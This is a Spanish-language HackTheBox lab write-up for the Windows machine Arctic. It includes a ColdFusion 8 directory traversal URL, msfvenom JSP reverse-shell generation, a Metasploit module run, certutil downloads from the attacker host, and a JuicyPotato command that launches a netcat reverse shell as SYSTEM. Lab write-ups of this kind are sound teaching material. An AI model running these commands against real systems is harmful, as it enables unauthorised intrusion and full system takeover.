---
title: "HTB - Arctic"
platform: "[[HackTheBox]]"
os: "Windows"
tags:
  - Windows
  - ColdFusion
  - JRun
  - Directory-Traversal
  - SeImpersonatePrivilege
  - JuicyPotato
  - Token-Impersonation
  - Privilege-Escalation
hashtags:
  - "#ColdFusion"
  - "#WindowsPrivilegeEscalation"
  - "#JuicyPotato"
  - "#HTB"
  - "#Arctic"
image:
  path: /assets/images/posts/htb/arctic/arctic-banner.png
  alt: "HTB Arctic Banner"
toc: true
toc_label: "📑 Contenido"
toc_sticky: true

---

## Resumen Ejecutivo

Se realizó un compromiso exitoso contra la máquina **Arctic** (IP `10.129.35.190`), un sistema **Windows** que ejecuta **Adobe ColdFusion 8** sobre **JRun Web Server** en el puerto 8500.

El vector de entrada fue un **Directory Traversal** (vulnerabilidad conocida en ColdFusion 8) que permitió leer archivos sensibles del sistema, incluyendo `password.properties` que contenía un hash SHA-1 de la contraseña del panel de administración.

Si bien el hash no pudo ser crackeado con diccionarios comunes, se utilizó el módulo de Metasploit `coldfusion_fckeditor` (exploit `multi/http/coldfusion_fckeditor`) para subir un payload JSP y obtener una shell inicial como el usuario `tolis`.

La escalada de privilegios se logró abusando del privilegio `SeImpersonatePrivilege` mediante la herramienta **JuicyPotato**, suplantando al usuario `NT AUTHORITY\SYSTEM` y obteniendo control total del sistema.

### 🚨 Riesgos Identificados

| Riesgo | Impacto | Probabilidad | Severidad |
|--------|---------|--------------|-----------|
| Directory Traversal en ColdFusion 8 | Exposición de archivos sensibles (hashes, configuraciones) | Confirmado | 🔴 CRÍTICO |
| Panel de administración ColdFusion sin protección | Acceso no autorizado al panel | Confirmado | 🔴 CRÍTICO |
| Servicio JRun expuesto en puerto 8500 | Superficie de ataque ampliada | Confirmado | 🔴 CRÍTICO |
| Privilegio `SeImpersonatePrivilege` habilitado | Escalada directa a SYSTEM | Confirmado | 🟠 ALTO |

### ✅ Plan de Remediación

| Riesgo | Recomendación |
|--------|----------------|
| Directory Traversal | Actualizar ColdFusion a la última versión (8.x ya no tiene soporte → migrar a versión moderna) |
| Panel expuesto | Restringir acceso al panel `/CFIDE/administrator/` por IP o implementar autenticación de dos factores |
| Servicio JRun | Bloquear acceso externo al puerto 8500 o migrar aplicación a IIS con protección WAF |
| `SeImpersonatePrivilege` | Revisar políticas de asignación de privilegios; remover de usuarios no administrativos |

---

## Machine Info (Arctic)

| Clave | Valor |
|-------|-------|
| **Nombre** | Arctic |
| **IP** | `10.129.35.190` |
| **OS** | Windows |
| **Hostname** | Arctic |
| **Dificultad** | Easy |
| **Skills** | ColdFusion, Directory Traversal, JSP Reverse Shell, SeImpersonate, JuicyPotato |
| **Fecha** | 2026-05-20 |

---

## Reconocimiento

En esta fase se recolecta información sobre el objetivo sin interactuar de forma agresiva.

### 🎯 Target Scoping

- **IP Objetivo:** `10.129.35.190`
- **Hostname Detectado:** `Arctic`
- **Sistema:** Windows (TTL 127 indica Windows)

```bash
❯ target 10.129.35.190
❯ ping -c 1 $(target)
PING 10.129.35.190 (10.129.35.190) 56(84) bytes of data.
64 bytes from 10.129.35.190: icmp_seq=1 ttl=127 time=118 ms

--- 10.129.35.190 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 118.077/118.077/118.077/0.000 ms
```

> **Nota:** El alias `$(target)` simplifica los comandos y evita errores al escribir la IP manualmente.

### Whatweb

Whatweb identifica tecnologías web sin enviar peticiones agresivas.

```bash
whatweb http://$(target):8500
http://10.129.35.190:8500 [200 OK] Country[RESERVED][ZZ], maybe Dell-OpenManage-Switch-Administrator, HTTPServer[JRun Web Server], IP[10.129.35.190], Index-Of, Title[Index of /]
```

**Interpretación:** El servidor web es **JRun**, que suele alojar aplicaciones **ColdFusion**.

### Nmap

Escaneo rápido de puertos abiertos (SYN scan, alta velocidad):

```bash
nmap -p- --open -sS --min-rate=2000 -n -v -Pn $(target) -oN allPorts

# OUTPUT
PORT      STATE SERVICE
135/tcp   open  msrpc
8500/tcp  open  fmtp
49154/tcp open  unknown
```

Escaneo detallado de servicios y versiones sobre los puertos descubiertos:

```bash
nmap -p135,8500,49154 -sCV -Pn $(target) -oN allServices.txt

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

| Puerto | Servicio | Significado |
|--------|----------|-------------|
| 135 | msrpc | Mapeador de endpoints RPC de Windows (muy común) |
| 8500 | http (JRun) | Servidor web de Macromedia/Adobe JRun (a veces corre aplicaciones ColdFusion o Java) |
| 49154 | msrpc | Otro RPC dinámico de Windows (normal) |

> **Conclusión del escaneo:** El puerto 8500 es la entrada más prometedora por correr un servidor web con tecnología JRun/ColdFusion.

### Nikto

Nikto es un escáner de vulnerabilidades web. Se usó con timeouts para no saturar el servicio (recordemos que era frágil).

```bash
nikto -h http://$(target):8500/ -timeout 5 -maxtime 30
```

### Exploración manual del servicio web

Lo **interesante** para atacar es el **8500** (HTTP).

![Archivos expuestos](/assets/img/posts/htb/artic/20260520122125.png)

Al acceder a `http://10.129.35.190:8500` se observa un **directory listing** (listado de directorios). Navegando se encuentra el panel de administración de **ColdFusion** en `/CFIDE/administrator/`.

Al intentar iniciar sesión con la contraseña `admin`, el sistema transforma automáticamente la contraseña en un hash:

`2B838992B5ED586A0BA1A4B1F1249CF0472B08EA`

![Panel](/assets/img/posts/htb/artic/20260520122205.png)


Este hash no es crackeable con diccionarios comunes (se probó con rockyou.txt).

---

## Explotación

Aquí se utilizan las vulnerabilidades identificadas para obtener acceso inicial.

### Opción 1: Searchsploit (RCE directo)

Existe un exploit de Remote Command Execution para ColdFusion 8 que permite ejecutar comandos directamente.

```bash
❯ searchsploit coldfusion 8 rce
------------------------------------------------------- ---------------------------
 Exploit Title                                         |  Path
------------------------------------------------------- ---------------------------
Adobe ColdFusion 8 - Remote Command Execution (RCE)    | cfm/webapps/50057.py
------------------------------------------------------- ---------------------------
```
![Access](/assets/img/posts/htb/artic/20260520160010.png)


### Opción 2: Directory Traversal para leer archivos

Se realizó una búsqueda en searchsploit específica para directory traversal en ColdFusion:

```bash
searchsploit coldfusion directory traversal
-----------------------------------------------------------------------------------------------------------
 Exploit Title                             |  Path
-----------------------------------------------------------------------------------------------------------
Adobe ColdFusion - Directory Traversal     | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit) | multiple/remote/16985.rb
-----------------------------------------------------------------------------------------------------------

searchsploit -m multiple/remote/14641.py
```

Dentro del archivo descargado se observa cómo realizar un path traversal para exponer el hash de la contraseña:

```bash
# Working GET request courtesy of carnal0wnage:
http://10.129.35.190:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
# LLsecurity added another admin page filename: "/CFIDE/administrator/enter.cfm"
```
![Coldfusion](/assets/img/posts/htb/artic/20260520123228.png)



#### Hash cracking (intento fallido)

Se intentó crackear el hash obtenido con hashcat usando el diccionario rockyou.txt:

```bash
# Guardando el hash
echo "2B838992B5ED586A0BA1A4B1F1249CF0472B08EA" > coldfusion.hash

# Identificando el Hash con hashcat
hashcat -m 100 -a 0 coldfusion.hash /usr/share/wordlists/rockyou.txt

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 100 (SHA1)
```
![crackstation](/assets/img/posts/htb/artic/20260520124744.png)


> **Nota:** El hash no fue crackeable con rockyou.txt, por lo que se procedió con otros métodos de explotación.

### Opción 3: Subida manual de payload JSP

Al realizar el reconocimiento se encuentra una tarea programada que permite hacer una consulta a la máquina atacante y descargar un archivo.

Se genera un payload malicioso en formato JSP (interpretado por ColdFusion 8):

```bash
# Listar payloads JSP disponibles
msfvenom -l payloads | grep jsp
java/jsp_shell_reverse_tcp    

# Comando para crear el archivo 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.20 LPORT=443 -o reverse.jsp
Payload size: 1496 bytes
Saved as: reverse.jsp
```

Este archivo se sube en la ruta que muestra el mapping del panel:  
**C:\ColdFusion8\wwwroot\CFIDE**

![Task](/assets/img/posts/htb/artic/20260520143731.png)


Se levanta un servidor HTTP simple en Kali para que la máquina víctima pueda descargar el payload:

```bash
python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.129.35.190 - - [20/May/2026 14:42:06] "GET /reverse.jsp HTTP/1.1" 200 -
```

### Opción 4: Metasploit + BurpSuite (técnica avanzada)

Encontramos otro directory traversal con orientación a Metasploit.

**Nota importante:** El módulo correcto está en `multi/http/`, **no** en `windows/http/` (el buscador puede mostrar la ruta incorrecta).

```bash
msfconsole -q
msf > grep windows search coldfusion
msf > use exploit/windows/http/coldfusion_fckeditor   # Esta ruta puede dar error
# La ruta correcta es:
msf > use multi/http/coldfusion_fckeditor
msf > show options
msf > set RHOSTS 10.129.35.190
msf > set RPORT 8500
msf > set LHOST 10.10.15.20
msf > set VERBOSE true
msf > run
```

#### Redirección con BurpSuite

Para que Metasploit funcione correctamente con este objetivo, es necesario redirigir el tráfico usando BurpSuite como proxy intermedio. La configuración consiste en:

1. Configurar BurpSuite para escuchar en `127.0.0.1:8080`
2. Configurar Metasploit para usar ese proxy: `set PROXY HTTP:127.0.0.1:8080`
3. Desde BurpSuite, redirigir las peticiones al puerto `8500` de la máquina víctima

Esto permite modificar/inspeccionar el tráfico y evitar problemas de compatibilidad del módulo.

---

## Acceso al sistema

![Acces system](/assets/img/posts/htb/artic/20260520154854.png)


Nos ponemos en escucha con netcat (usando `rlwrap` para mantener la historia de comandos):

```bash
rlwrap nc -lvnp 443
```

![Root](/assets/img/posts/htb/artic/20260525182509.png)


Una vez ejecutado el exploit (o la tarea con el JSP), obtenemos una shell en el sistema como el usuario `tolis`.

---

## Escalada de privilegios

Una vez dentro del sistema, el objetivo es convertirse en `NT AUTHORITY\SYSTEM` (equivalente al usuario root en Windows).

### Enumeración inicial

```bash
C:\Users\tolis\Desktop>whoami
active\tolis

C:\Users\tolis\Desktop>whoami /priv
SeImpersonatePrivilege        Impersonate a client after authentication Enabled

C:\Users\tolis\Desktop>systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
System Type:               x64-based PC
```

> **Interpretación:** El usuario `tolis` tiene el privilegio `SeImpersonatePrivilege` habilitado. Esto es una puerta de entrada perfecta para escalar privilegios en Windows Server 2008 R2.

### Abuso de escalada con JuicyPotato

El privilegio `SeImpersonatePrivilege` en Windows Server 2008 R2 es vulnerable a la técnica **JuicyPotato**. Esta técnica permite crear un proceso con la identidad de `SYSTEM` abusando de COM (Component Object Model).

#### Paso 1: Preparar las herramientas en Kali

Descargamos los binarios necesarios:

1. **JuicyPotato (x64):**

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
    
2. **Netcat para Windows (x64):** (viene preinstalado en Kali en `/usr/share/windows-resources/binaries/nc.exe`)

```bash
cp /usr/share/windows-resources/binaries/nc.exe .
```

Iniciamos un servidor web para transferir los archivos:

```bash
python3 -m http.server 8888
```

#### Paso 2: Descargar los binarios en la víctima

Nos movemos a una ruta con permisos de escritura (`C:\Users\Public`) y usamos `certutil` para descargar:

```bash
cd C:\Users\Public

certutil.exe -urlcache -split -f http://10.10.14.26:8888/JuicyPotato.exe jp.exe
certutil.exe -urlcache -split -f http://10.10.14.26:8888/nc.exe nc.exe
```

#### Paso 3: Abrir listener en Kali

Abrimos una nueva terminal en Kali para recibir la shell con privilegios:

```bash
nc -lvnp 5555
```

#### Paso 4: Ejecutar JuicyPotato

Le indicamos a JuicyPotato que:
- Abuse del privilegio (`-t *`)
- Ejecute `cmd.exe`
- Ejecute a su vez `nc.exe` para enviarnos una shell reversa al puerto 5555
- Use un CLSID válido para Windows Server 2008 R2 (el del servicio BITS)

```bash
jp.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\Users\Public\nc.exe -e cmd.exe 10.10.14.26 5555" -l 1337 -c "{49e0dba2-2011-11d1-83a4-00c04fdd267c}"
```

### Acceso como SYSTEM

```bash
❯ rlwrap nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.14.26] from (UNKNOWN) [10.129.3.218] 49665
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

### Flags obtenidas

```bash
# User flag
C:\Users\tolis\Desktop> type user.txt
[Bloqueado]

# Root flag
C:\Users\Administrator\Desktop> type root.txt
[Bloqueado]
```

---

## Lecciones aprendidas

1. **ColdFusion 8 es extremadamente vulnerable** → migrar o aislar.
2. **El directory traversal + panel expuesto** es una combinación letal.
3. **El privilegio `SeImpersonatePrivilege`** en Windows Server ≤ 2016 permite escalada con herramientas como JuicyPotato, RoguePotato, PrintSpoofer.
4. **No todo se crackea con rockyou.txt** → a veces hay que cambiar de técnica.
5. **Metasploit ayuda, pero entender manualmente el ataque es clave.**
6. **El fuzzing agresivo puede matar servicios frágiles** → usar herramientas como Nikto con timeouts o scripts de nmap más respetuosos.

---

## Herramientas utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Escaneo de puertos y servicios |
| `whatweb` | Reconocimiento web |
| `nikto` | Escaneo de vulnerabilidades web |
| `Metasploit` | Explotación de ColdFusion |
| `msfvenom` | Generación de payload JSP |
| `JuicyPotato` | Escalada a SYSTEM |
| `netcat` | Recepción de shells reversas |
| `certutil` | Descarga de binarios en Windows |
| `searchsploit` | Búsqueda de exploits públicos |
| `hashcat` | Cracking de hashes SHA-1 |
| `BurpSuite` | Proxy para redireccionar tráfico de Metasploit |

---

## 📚 Referencias

- [HackTheBox - Arctic (Writeup en YouTube)](https://www.youtube.com/watch?v=e9lVyFH7-4o)
- [CVE-2009-2265 - ColdFusion Directory Traversal](https://nvd.nist.gov/vuln/detail/CVE-2009-2265)
- [JuicyPotato - Abusing SeImpersonatePrivilege](https://github.com/ohpe/juicy-potato)